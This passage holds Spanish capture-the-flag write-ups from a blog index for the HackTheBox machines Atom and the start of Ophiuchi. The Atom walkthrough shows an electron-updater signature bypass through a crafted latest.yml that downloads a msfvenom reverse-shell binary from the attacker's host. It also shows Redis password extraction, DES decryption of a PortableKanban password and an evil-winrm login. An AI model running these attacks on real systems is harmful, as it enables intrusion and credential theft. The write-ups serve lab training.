que nos servir√°n para jugar dentro del servidor. Enumerando la base de datos tendremos otras credenciales en este caso del usuario Administrator, pero la contrase√±a estar√° encriptada‚Ä¶ Estando perdidos sin saber como desencriptarla enumeraremos de nuevo y veremos que kanban y redis est√°n relacionados, kanban le da la interfaz y redis el backend para guardar informaci√≥n, por lo que la data encontrada (las credenciales) llegaron desde kanban a redis‚Ä¶ Usaremos un exploit encargado de desencriptar contrase√±as generadas desde kanban, con esto obtendremos en texto plano la contrase√±a del usuario Administrator. Haciendo reutilizaci√≥n de contrase√±as (y usando evil-winrm) conseguiremos una Shell en el sistema como Administrator. ‚Ä¶ Clasificaci√≥n de la m√°quina:  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶ Camino de verdades y rarezas:  Enumeraci√≥n.      Enumeraci√≥n de puertos con nmap.     Explotaci√≥n.      (EL FAIL) Generando latest. yml, binario malicioso y hash sha512.    (EL BUENARDO) Generando latest. yml, binario malicioso y hash sha512.    Obtenci√≥n Reverse Shell usuario jason.     Escalada de privilegios.      Acceso servidor redis credenciales encontradas en archivo . conf.    Dumpeo base de datos redis.    Desencriptamos la contrase√±a del usuario Administrator.    ‚Ä¶ Enumeraci√≥n #: Enumeraci√≥n de puertos con nmap ‚åñ: Empezaremos jugando con nmap para ver que servicios esta corriendo la m√°quina: ‚ù± nmap -p- --open -v 10. 10. 10. 237 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   Obtenemos: ‚ù± cat initScan# Nmap 7. 80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 237# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 237 ()  Status: UpHost: 10. 10. 10. 237 ()  Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 5985/open/tcp//wsman///, 6379/open/tcp//redis/// Ignored State: filtered (65529)# Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 202. 56 seconds      Puerto   Descripci√≥n         80   HTTP: Nos provee de un servidor web.        135   RPC: Permite la comunicaci√≥n entre programas.        443   HTTPS: Es un servidor web con un certificado ‚Äúseguro‚Äù.        445   SMB: Nos ayuda a la transferencia de archivos en una red.        5985   WinRM: Nos permite realizar tareas administrativas remotamente (entre muuuchas cosas +).        6379   Redis: Motor BD para almacenar datos en memoria.    Ahora que tenemos los puertos activos, hagamos un escaneo m√°s profundo, tratando asi de identificar que versiones y scripts est√°n relacionados con cada servicio: ~(Usando la funci√≥n extractPorts (referenciada antes) podemos copiar r√°pidamente los puertos en la clipboard, as√≠ no tenemos que ir uno a uno ‚ù± extractPorts initScan [*] Extracting information. . .   [*] IP Address: 10. 10. 10. 237  [*] Open ports: 80,135,443,445,5985,6379[*] Ports copied to clipboard)~ ‚ù± nmap -p 80,135,443,445,5985,6379 -sC -sV 10. 10. 10. 237 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos       -sC   Muestra todos los scripts relacionados con el servicio       -sV   Nos permite ver la versi√≥n del servicio       -oN   Guarda el output en un archivo   Y ahora el escaneo nos responde con: ‚ù± cat portScan# Nmap 7. 80 scan initiated Wed Jun 23 25:25:25 2021 as: nmap -p 80,135,443,445,5985,6379 -sC -sV -oN portScan 10. 10. 10. 237Nmap scan report for 10. 10. 10. 237Host is up (0. 11s latency). PORT   STATE SERVICE   VERSION80/tcp  open http     Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27|_http-title: Heed Solutions135/tcp open msrpc    Microsoft Windows RPC443/tcp open ssl/http   Apache httpd 2. 4. 46 ((Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27)| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2. 4. 46 (Win64) OpenSSL/1. 1. 1j PHP/7. 3. 27|_http-title: Heed Solutions| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1. 1445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)5985/tcp open http     Microsoft HTTPAPI httpd 2. 0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2. 0|_http-title: Not Found6379/tcp open redis    Redis key-value storeService Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h23m50s, deviation: 4h02m32s, median: 3m48s| smb-os-discovery: |  OS: Windows 10 Pro 19042 (Windows 10 Pro 6. 3)|  OS CPE: cpe:/o:microsoft:windows_10::-|  Computer name: ATOM|  NetBIOS computer name: ATOM\x00|  Workgroup: WORKGROUP\x00|_ System time: 2021-06-23T10:26:40-07:00| smb-security-mode: |  account_used: guest|  authentication_level: user|  challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: |  2. 02: |_  Message signing enabled but not required| smb2-time: |  date: 2021-06-23T17:26:36|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap. org/submit/ . # Nmap done at Wed Jun 23 25:25:25 2021 -- 1 IP address (1 host up) scanned in 69. 09 secondsEncontramos algunas cositas relevantes:       Puerto   Servicio   Versi√≥n         80   HTTP   Apache httpd 2. 4. 46 OpenSSL/1. 1. 1j PHP/7. 3. 27       443   HTTPS   Apache httpd 2. 4. 46 OpenSSL/1. 1. 1j PHP/7. 3. 27       445   SMB   Windows 10 Pro 19042 (Windows 10 Pro 6. 3)   Pero no encontramos nada m√°s, as√≠ que empecemos a explorar cada puerto y veamos cu√°l ser√° nuestra entrada (: ‚Ä¶ Puerto 80 ‚åñ:  Encontramos una descripci√≥n que nos habla sobre una aplicaci√≥n para tomar notas‚Ä¶ Vemos un email:  MrR3boot@atom. htb, del cual podemos extraer:     el usuario (MrR3boot)   y el dominio (atom. htb).    Y que si colocamos el mouse sobre el bot√≥n Download for Windows, nos redireccionara a /releases/heed_setup_v1. 0. 0. zip, o sea nos descargara un comprimido . zip: Pues d√©mosle clic :P Obtenemos: ‚ù± file heed_setup_v1. 0. 0. zip heed_setup_v1. 0. 0. zip: Zip archive data, at least v2. 0 to extractY al hacer la extracci√≥n encontramos un binario . exe al parecer de instalaci√≥n: ‚ù± unzip heed_setup_v1. 0. 0. zip Archive: heed_setup_v1. 0. 0. zip inflating: heedv1 Setup 1. 0. 0. exeJmmm, en mi m√°quina no puedo probarlo, ya que tengo un problema con wine, por lo tanto deber√≠a jugar con el binario pero en una m√°quina virtual Windows :/ Pero antes de intentar cualquier cosa veamos si encontramos alguna cadena de texto en el binario: ‚ù± strings heedv1\ Setup\ 1. 0. 0. exeAl final del resultado vemos que se repite 3 veces esto: . . . Athens1London1HackTheBox1HackTheBox1HackTheBox1admin@htb. local0. . . Lo m√°s probable es que no sea nada pero pues por si algo e. e Exploremos el servicio SMB antes de movernos de VM. ‚Ä¶ Puerto 445 ‚åñ: Con el protocolo SAMBA podemos compartir recursos a traves de la red (entre muchas cositas m√°s), existen herramietnas que nos ayudan a validar la existencia de recursos compartidos, una de ellas es smbmap, usemosla y veamos si encontramos algo: Jugamos con credenciales ‚Äúnulas‚Äù ya que no tenemos reales. ‚ù± smbmap -H 10. 10. 10. 237 -u 'null' -p 'null'[+] Guest session    IP: 10. 10. 10. 237:445  Name: unknown                          Disk                          Permissions   Comment    ----                          -----------   -------    ADMIN$                         NO ACCESS    Remote Admin    C$                           NO ACCESS    Default share    IPC$                          READ ONLY    Remote IPC    Software_Updates                    READ, WRITEBien, vemos 4 recursos pero solo 1 interesante: Software_Updates, a el tenemos acceso de lectura yyy escritura, profundicemos en √©l con ayuda de smbclient: ‚ù± smbclient //10. 10. 10. 237/Software_Updates -U 'null'Enter WORKGROUP\null's password: Try  help  to get a list of possible commands. smb: \&gt; dir .                  D    0 Wed Jun 23 13:04:00 2021 . .                  D    0 Wed Jun 23 13:04:00 2021 client1               D    0 Wed Jun 23 13:04:00 2021 client2               D    0 Wed Jun 23 13:04:00 2021 client3               D    0 Wed Jun 23 13:04:00 2021 UAT_Testing_Procedures. pdf     A  35202 Fri Apr 9 06:18:08 2021        4413951 blocks of size 4096. 1367275 blocks availablesmb: \&gt; Opa, m√°s directorios, pero dentro de ellos no encontramos nada, as√≠ que solo nos queda el archivo . pdf, descargu√©moslo a nuestra m√°quina y veamos que contiene: smb: \&gt; prompt offsmb: \&gt; mget UAT_Testing_Procedures. pdfgetting file \UAT_Testing_Procedures. pdf of size 35202 as UAT_Testing_Procedures. pdf (61,2 KiloBytes/sec) (average 61,2 KiloBytes/sec)‚ù± file UAT_Testing_Procedures. pdf UAT_Testing_Procedures. pdf: PDF document, version 1. 3‚Ä¶ Explotaci√≥n #: Bien, usemos xdg-open para ver el PDF: ‚ù± xdg-open UAT_Testing_Procedures. pdfYyyyy:  Destacamos varias cosas muyyy interesantes de cara a la explotaci√≥n:  Fue creado con electron-builder (puede ser relevante, no lo sabemos).  Update server running hace referencia a la carpeta compartida Software_Updates entiendo yo.  ‚Äúclient folders‚Äù, ya los vimos (y vimos que tenemos permisos de escritura sobre ellos).  El equipo de pruebas (QA) tomara el contenido de esas carpetas ‚Äúclient‚Äù y verificara si existen cambios, si los hay los instalar√° como si fuera una ‚Äúactualizaci√≥n‚Äù.      Por lo tanto podemos pensar que debemos modificar el binario . exe agregando contenido malicioso, subirlo a alguna carpeta client y el sistema lo ejecutar√°, por lo tanto ejecutar√≠a el contenido malicioso, ¬øno? A DARLE!!   Buscando en internet cositas sobre electron builder exploit llegamos a varios recursos:  RCE using XSS in Electron applications.  The dangers of Electron‚Äôs shell. openExternal(). Pero el master de los masters es este, con √©l seguiremos el resto del writeup:  Signature Validation Bypass Leading to RCE In Electron-Updater. En √©l se habla de un feature llamado electron-updater, el cual se encarga de auto actualizar software (lo que est√°bamos hablando antes, pero automatizado), esto lo hace comparando los valores de publisherName (del binario que ya esta instalado) y el certificado Common Name (del binario a ser instalado)‚Ä¶ (Esto toma sentido mirando el c√≥digo fuente, ya que vemos las comparativas:)  Tomada del propio art√≠culo. Nos indica que en cada actualizaci√≥n, el servidor o aplicaci√≥n va a estar buscando un archivo llamado latest. yml, en √©l estar√≠a el nombre, ruta y hash relacionado con el programa, b√°sicamente la definici√≥n de lo que queramos actualizar‚Ä¶ En el c√≥digo vemos al inicio una ejecucion llamativa, que llevada a la acci√≥n tomar√≠a estos valores (por ejemplo):  powershell. exe -NoProfile -NonInteractive -InputFormat None -Command  Get-AuthenticodeSignature 'C:\Users\carlitos\AppData\Roaming\vulnerable_app\__update__\new_update. exe' | ConvertTo-Json -Compress Donde C:\Users. . . . exe es un valor tomado de la variable tempUpdateFile, ac√° es donde entramos nosotros como atacantes (: Como la variable tempUpdateFile no tiene ning√∫n filtro o cuenta con alg√∫n escape, podemos forzar un bypass a la validaci√≥n de publisherName y Common Name mediante un error en la ejecucion del script. Esto de una manera muy sencilla, solo debemos crear un binario con una ' en el nombre y esto har√° que el programa falle, peeeero para que sea ejecutado necesitamos generar un hash que se relacione con el programa creado, as√≠ logramos que el actualizador tome nuestro programa como leg√≠timo. Pues d√©mosle, generemos el archivo latest. yml, el binario malicioso yyyy el hash de ese binario: ‚Ä¶ (FAIL) latest. yml, bin malicioso y hash ‚åñ: Siguiendo el art√≠culo y sus pocs tendr√≠amos: try'now. exe (binario malicioso): Generaremos un binario que a la hora de ejecutarse nos lance una reverse Shell, ayud√©monos de msfvenom para esto: ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 103 LPORT=4433 -f exe -o try\'now. exe‚ù± file  try'now. exe try'now. exe: PE32 executable (GUI) Intel 80386, for MS WindowsAhora generamos el hash identificador (el propio blog nos provee de esta l√≠nea): sha512 hash: ‚ù± shasum -a 512 try\'now. exe | cut -d     -f 1 | xxd -r -p | base64 | tr -d '\n'0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==Y por √∫ltimo el archivo que estar√° buscando el servidor. latest. yml: (Una de las tantas pruebas) version: 1. 2. 3files: - url: try';try\'now. exe;'now. exe sha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q== size: 73802path: try';try\'now. exe;'now. exesha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==releaseDate: '2019-11-20T11:17:02. 627Z'Y con esto ya tendriamos los 3 pasos, el caso es que el script leeria el archivo latest. yml, daria error en try' y en teoria deberia ejecutar try\'now. exe, o sea, nuestro payload con la Reverse Shell‚Ä¶ Lo unico que nos quedaria hacer seria, subir el binario try'now. exe y el objeto latest. yml a alguna de las carpetas client y ver si pasa algo (: Spoiler: No pasa nada :P Pero antes, nos ponemos en escucha con ayuda de netcat por el puerto que indicamos en el binario malicioso: ‚ù± nc -lvp 4433listening on [any] 4433 . . . Ahora si: ‚ù± smbclient //10. 10. 10. 237/Software_Updates -U 'null'Enter WORKGROUP\null's password: Try  help  to get a list of possible commands. smb: \&gt; cd client2smb: \client2\&gt; put try'now. exe putting file try'now. exe as \client2\try'now. exe (43,3 kb/s) (average 43,3 kb/s)smb: \client2\&gt; put latest. yml putting file latest. yml as \client2\latest. yml (0,4 kb/s) (average 34,5 kb/s)Entiendo que generar√≠a el error y en la misma ruta en la que esta el objeto latest. yml buscara el binario try'now. exe y lo ejecutara‚Ä¶ Pues nada, prob√© y prob√© cosas, cambie la ruta, me invente otras, jugu√© para en tal caso diera error ejecutara despues certutil. exe . . . , pero tampoco, bueno, varias cositas hice, hasta que por fin prob√© algo que funciono‚Ä¶ ‚Ä¶ (EL GOOD) latest. yml, bin malicioso y hash ‚åñ: Tomando nuestro archivo latest. yml me fui pa la web a buscar ejemplos de √©l, llegamos a este:  Auto Update - Staged Rollouts, Electron Build Docs. En √©l tenemos esta estructura: As√≠ que la tome y empece a jugar con ella, quitando as√≠ el apartado files que hab√≠a antes (y como stagingPercentage no estaba en el art√≠culo inicial, tambi√©n lo quite): version: 1. 2. 3path: try\'now. exesha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==Pero nadita de nadita‚Ä¶ En un momento se me dio por probar colocar una ruta hacia alg√∫n servidor web en path, ah√≠ me cambio la cara: Levantamos el servidor web: ‚ù± python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . Y ahora nuestro archivo latest. yml quedar√≠a as√≠: version: 1. 2. 3path: http://10. 10. 14. 103:8000/try'now. exesha512: 0Wxg/xq3XPmrHevFPBwR4aSmnc8b+5gaKB9HuEAZcBXghS2MaDblK3lRPOpCEMiqe5wFI2ZxMQ7Jc7M2JSTF8Q==Lo subimos al servidor SMB: smb: \client2\&gt; put latest. ymlY en nuestro servidor web recibimos: ‚ù± python3 -m http. serverServing HTTP on 0. 0. 0. 0 port 8000 (http://0. 0. 0. 0:8000/) . . . 10. 10. 10. 237 - - [23/Jun/2021 25:25:25] code 404, message File not found10. 10. 10. 237 - - [23/Jun/2021 25:25:25]  GET /try'now. exe. blockmap HTTP/1. 1  404 -10. 10. 10. 237 - - [23/Jun/2021 25:25:25]  GET /try%27now. exe HTTP/1. 1  200 -Opa opa opaaaa, vaya cosa extra√±aaaa, peeero tenemos respuesta (: Yyyy en nuestro listener que ten√≠amos de antes recibimooooooooooooooooooooooooooos: :O Pero siento que quedo desorganizado, as√≠ que haremos una vez m√°s el proceso mucho m√°s directo: Obtenemos Reverse Shell como jason ‚åñ: Generamos binario . exe malicioso: ‚ù± msfvenom -p windows/shell_reverse_tcp LHOST=10. 10. 14. 103 LPORT=4433 -f exe -o try\'now. exeLe volvemos a generar un hash, ya que si cambia el contenido del programa, cambia el hash:  Si el programa es el mismo no hace falta volver a generarlo, ya que toma el hash, lo busca en las ‚Äúupdates‚Äù y ejecuta lo que este relacionado a √©l, o sea, no necesitariamos el servidor web. ‚ù± shasum -a 512  try'now. exe  | cut -d     -f1 | xxd -r -p | base64 | tr -d '\n'AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==Ahora actualizamos el archivo latest. yml: version: 1. 2. 3path: http://10. 10. 14. 103:8000/try'now. exesha512: AOztWPlDvzM4pyop/YcVeKbFXQzDOSRrtOb0NUGfxeDPaDTfRJtu/qDYmXjh76gMbsZx4coGmgCvxUQ1J48dXQ==Nos ponemos en escucha, tanto por el servidor web como por netcat (puerto 4433). Subimos el objeto latest. yml a alguna carpeta compartida: smb: \client2\&gt; put latest. yml Yyyyy en nuestro listener tendr√≠amos la Reverse Shell (:  La idea que teniamos de modificar el binario con cositas maliciosas cayo en picada :( no era tan por ah√≠, pero igual no estabamos TAAAAN erroneos e. e ‚Ä¶  Script que nos automatiza todo el proceso y genera Shell, electroPWn. py.  (Ten en cuenta que m√°s o menos cada 30 segundos ejecuta lo que hay en las carpetas cliente, entonces puede ser random que te lance la Reverse Shell en el tiempo que esta escuchando el programa (igual puedes jugar con esos tiempos), pero de 10 intentos, 7 me la devolvi√≥ en una sola ejecuci√≥n. ) Pero repito, es bastante random :( ‚Ä¶ Escalada de privilegios #: Enumerando el sistema (y recordando nuestro escaneo de nmap) encontramos cositas relacionadas con el servicio Redis en la ruta C:\Program Files\Redis: PS C:\Program Files\Redis&gt; dir  Directory: C:\Program Files\RedisMode         LastWriteTime     Length Name----         -------------     ------ ----d-----     4/2/2021  7:31 AM        Logs-a----     7/1/2016  3:54 PM      1024 EventLog. dll-a----     7/1/2016  3:52 PM     12618 Redis on Windows Release Notes. docx-a----     7/1/2016  3:52 PM     16769 Redis on Windows. docx-a----     7/1/2016  3:55 PM     406016 redis-benchmark. exe-a----     7/1/2016  3:55 PM    4370432 redis-benchmark. pdb-a----     7/1/2016  3:55 PM     257024 redis-check-aof. exe-a----     7/1/2016  3:55 PM    3518464 redis-check-aof. pdb-a----     7/1/2016  3:55 PM     268288 redis-check-dump. exe-a----     7/1/2016  3:55 PM    3485696 redis-check-dump. pdb-a----     7/1/2016  3:55 PM     482304 redis-cli. exe-a----     7/1/2016  3:55 PM    4517888 redis-cli. pdb-a----     7/1/2016  3:55 PM    1553408 redis-server. exe-a----     7/1/2016  3:55 PM    6909952 redis-server. pdb-a----     4/2/2021  7:39 AM     43962 redis. windows-service. conf-a----     4/2/2021  7:37 AM     43960 redis. windows. conf-a----     7/1/2016  9:17 AM     14265 Windows Service Documentation. docxVemos dos archivos de configuraci√≥n: . . . -a----     4/2/2021  7:39 AM     43962 redis. windows-service. conf-a----     4/2/2021  7:37 AM     43960 redis. windows. conf. . . Inicialmente no encontr√© nada en ellos, segu√≠ y segu√≠, me perd√≠ y despues ca√≠ en esta gu√≠a:  6379 - Pentesting Redis. En ella se habla de una autenticaci√≥n necesaria para jugar con redis y que en algunos casos es posible encontrarse contrase√±as en archivos . conf dentro del par√°metro requirepass: Acceso servidor Redis - archivo . conf ‚åñ: Probando a buscar esa cadena (el par√°metro) en los archivos de configuraci√≥n encontramos algo: PS C:\Program Files\Redis&gt; type redis. windows-service. conf | Select-String -Pattern 'requirepass' requirepass kidvscat_yes_kidvscat# If the master is password protected (using the  requirepass  configuration# requirepass foobaredVemos 3 resultados, pero solo uno sin comentarios (#), tomemos esa cadena y juguemos ahora con la utilidad redis-cli, con ella podemos movernos entre servidores de DB redis, usando el par√°metro auth dentro de la consola de redis le concatenamos la cadena encontrada (que ser√≠a la pw): ‚ù± redis-cli -h 10. 10. 10. 23710. 10. 10. 237:6379&gt; auth hola123(error) ERR invalid password10. 10. 10. 237:6379&gt; auth kidvscat_yes_kidvscatOKPerfecto, tamos dentro del servidor redis, apoy√°ndonos de la misma gu√≠a podemos dumpear las bases de datos existentes: Dumpeamos la base de datos Redis ‚åñ: Primero vemos cuantas DB hay: 10. 10. 10. 237:6379&gt; info. . . . . . # Keyspacedb0:keys=4,expires=0,avg_ttl=0Solo una base de datos con indice 0, juguemos con ella: 10. 10. 10. 237:6379&gt; SELECT 0OK10. 10. 10. 237:6379&gt; KEYS *1)  pk:ids:MetaDataClass 2)  pk:urn:metadataclass:ffffffff-ffff-ffff-ffff-ffffffffffff 3)  pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 4)  pk:ids:User 4 llaves, para dumpear sus valores debemos usar GET &lt;key&gt;, al jugar con la 3 encontramos esto: 10. 10. 10. 237:6379&gt; GET pk:urn:user:e8e29158-d70d-44b1-a1ba-4949d52790a0 {  Id : e8e29158d70d44b1a1ba4949d52790a0 ,  Name : Administrator ,  Initials :  ,  Email :  ,  EncryptedPassword : Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi ,  Role : Admin ,  Inactive :false,  TimeStamp :637530169606440253} Bien, informaci√≥n de un usuario llamado Administrator y entre ella una contrase√±a encriptada (: Buscando maneras de desencriptarla no llegamos a ning√∫n resultado, ac√° me reperdi un buen rato, as√≠ que decid√≠ buscar ayuda‚Ä¶ Me indicaron que enumerara el directorio de jason (c:\Users\jason) (cosa que ya hab√≠a hecho, peeeeero sobre vi algunas cosas)‚Ä¶ En el directorio c:\Users\jason\Downloads vemos una carpeta llamada PortableKanban y en ella varios objetos de kanban, uno de ellos es la gu√≠a para el usuario: PS C:\Users\jason\Downloads\PortableKanban&gt; dir  Directory: C:\Users\jason\Downloads\PortableKanbanMode         LastWriteTime     Length Name. . . -a----     1/4/2018  8:14 PM    1050092 User Guide. pdCopi√°ndonoslo a nuestra m√°quina, abri√©ndolo con xdg-open y ley√©ndolo caemos en cuenta de algo‚Ä¶ *(Podemos copiarlo f√°cilmente comparti√©ndonos una carpeta con *SMB (o incluso coloc√°ndolo en la carpeta compartida que ya existe en la m√°quina)). Levantamos carpeta llamada smbFolder: ‚ù± smbserver. py smbFolder $(pwd) -smb2supportY desde Windows indicamos: PS C:\Users\jason\Downloads\PortableKanban&gt; copy  User Guide. pdf  \\10. 10. 14. 103\smbFolder\ User Guide. pdf Ya lo tendr√≠amos: ‚ù± file User\ Guide. pdf User Guide. pdf: PDF document, version 1. 7Lo abrimos y: As√≠ que todo lo que pase por kanban debe ser manejado desde redis‚Ä¶ Y (lo que ya sab√≠amos) que existe un archivo con todas las configuraciones del servidor redis llamado redis. windows-service. conf.  Y vemos la estructura de la tabla de la cual encontramos valores anteriormente (los de administrator)‚Ä¶ Desencriptamos la contrase√±a de Administrator ‚åñ: Esto √∫ltimo me record√≥ una m√°quina de HTB (peque√±o spoiler, si no lo quieres, cierra los ojos, pero que puedas leer lo m√≠nimo, busca esto en unas 4, 5 l√≠neas abajo: Es practicamente lo mismo . . . , sigue desde ah√≠ üòú) la m√°quina Sharp, en ella hab√≠amos usado tambi√©n PortableKanban y deb√≠amos (tambi√©n &lt;redundancia :P&gt;) desencriptar unas contrase√±as que estaban almacenadas en un archivo . pk3. Esto lo logramos gracias a un exploit que tomaba ese archivo y con ayuda de una clave DES consegu√≠a la contrase√±a en texto plano. Es pr√°cticamente lo mismo, solo que en nuestro caso no tenemos ese tipo de archivos, simplemente la password. Juguemos con el script y hag√°mosle unas modificaciones:  PortableKanban 4. 3. 6578. 38136 - Encrypted Password Retrieval. Y a nosotros nos quedaria as√≠: import base64from des import *def decode(hash):  hash = base64. b64decode(hash. encode('utf-8'))  key = DesKey(b 7ly6UznJ )  return key. decrypt(hash,initial=b XuVUm5fR ,padding=True). decode('utf-8')print( Contrase√±a:   + decode( Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi ))En su ejecuci√≥n logramos el cometido, vemos la contrase√±a en texto plano: ‚ù± python3 kanban_decrypt. py Contrase√±a: kidvscat_admin_@123Listos‚Ä¶ Recordando que tenemos el puerto 5985 (WinRM) activo, podemos aprovechar el uso de evil-winrm para obtener una PowerShell en el sistema (siempre y cuando las credenciales sean v√°lidas, no nos emocionemos e. e): ‚ù± evil-winrm -i 10. 10. 10. 237 -u 'Administrator' -p 'kidvscat_admin_@123'Ejecutamos yyyyyyy: Estamos inside de la m√°quina como el usuario Administrator (: Tomemos las flags‚Ä¶ ‚Ä¶ No s√© por qu√© la m√°quina esta rateada tan bajito (actualmente tiene 2. 8) sino esta mal, quiz√°s puede ser por problemas que tuvo al inicio, porque temas de lentitud o fallos gratis no me cayeron. El inicio me pareci√≥ super interesante (adem√°s que es algo real, algo que pasa), lo de redis y kanban tambi√©n fue relevante, pero me llamo m√°s la atenci√≥n lo de electron (aunque tira tambi√©n mucho a la realidad). En general la m√°quina esta bien y esta pensada para ser Real Life. Y bueno, emoakabao. No siendo m√°s, yo me voy retirando, ah√≠ quedo todo organizado, la comida hecha y la ropa doblada, nos vemos yyyy a seguir rompiendo todo!! "
    }, {
    "id": 37,
    "url": "http://localhost:4000/htb/ophiuchi",
    "title": "HackTheBox - Ophiuchi",
    "body": "2021/07/03 - M√°quina Linux nivel medio. La deserializaci√≥n no puede faltar, pero esta vez parseando sintaxis YAML. Enumeraci√≥n b√°sica y finalmente tendremos que jugar con instrucciones de WebAssembly para modificar una constante traviesa. Con esto conseguiremos ejecutar un archivo que nos permitir√° obtener una Shell como root.  TL;DR (Spanish writeup): Creada por: felamos. Ejejeyyy ¬øc√≥mo est√°s? Listoooos a darle, nos encontraremos con un analizador/parseador/formateador/etc de sintaxis YAML, buscando vulnerabilidades relacionadas a ese proceso, nos topamos con una deserializaci√≥n en SnakeYAML que nos permite ejecuci√≥n remota de comandos‚Ä¶ Aprovech√°ndonos de ella obtendremos una Shell como el usuario tomcat. Enumerando la estructura base de tomcat tendremos el archivo tomcat-users. xml, donde obtendremos las credenciales del usuario admin hacia tomcat, pero reus√°ndolas podremos tener ahora una sesi√≥n como admin. Para la escalada, nos encontraremos con que admin puede ejecutar en la m√°quina mediante sudo un programa creado en el lenguaje de programaci√≥n Go. En su contenido hay dos archivos que est√°n siendo llamados de forma relativa, por lo que al ejecutar el programa los tomara de la ruta en la que estemos situados. Uno de ellos abarca WebAssembly, tendremos que modificar su ejecuci√≥n para lograr correr el otro programa (deploy. sh). Para la modificaci√≥n usaremos la herramienta wabt, jugaremos con archivos . wasm y . wat. Finalmente cambiamos el contenido de deploy. sh para que nos genere una Reverse Shell como el usuario root. A darle candela (: ‚Ä¶ Clasificaci√≥n de la m√°quina: Tiene tintes de realidad.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice. ‚Ä¶  Enumeraci√≥n.  Explotaci√≥n.  Movimiento Lateral.  Escalada de privilegios. ‚Ä¶ Enumeraci√≥n #: Realizaremos un escaneo de puertos para saber que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 227 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escaneamos todos los 65535 puertos.        ‚Äìopen   Solo los puertos que est√©n abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n de S4vitar que me permite extraer los puertos y guardarlos en la clipboard, esto para evitar copiar uno a uno (en caso de tener muchos) a mano en nuestro siguiente escaneo.    ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10. 10. 10. 227# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10. 10. 10. 227 ()  Status: UpHost: 10. 10. 10. 227 ()  Ports: 22/open/tcp//ssh///, 8080/open/tcp//http-proxy///# Nmap done at Wed Feb 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 142. 74 secondsPerfecto, nos encontramos los servicios:       Puerto   Descripci√≥n         22   SSH: Acceso remoto a servidores por medio de un canal seguro.        8080   HTTP Proxy: Intermediario entre peticiones web.    Hagamos un escaneo de scripts y versiones con base en cada servicio (puerto), con ello obtenemos informaci√≥n m√°s detallada de cada uno: ‚ù≠ nmap -p 22,8080 -sC -sV 10. 10. 10. 227 -oN portScan      Par√°metro   Descripci√≥n         -p   Escaneo de los puertos obtenidos.        -sC   Muestra todos los scripts relacionados con el servicio.        -sV   Nos permite ver la versi√≥n del servicio.        -oN   Guarda el output en un archivo.    ‚ù≠ cat portScan # Nmap 7. 80 scan initiated Wed Feb 17 25:25:25 2021 as: nmap -p 22,8080 -sC -sV -oN portScan 10. 10. 10. 227Nmap scan report for 10. 10. 10. 227Host is up (0. 19s latency). PORT   STATE SERVICE VERSION22/tcp  open ssh   OpenSSH 8. 2p1 Ubuntu 4ubuntu0. 1 (Ubuntu Linux; protocol 2. 0)8080/tcp open http  Apache 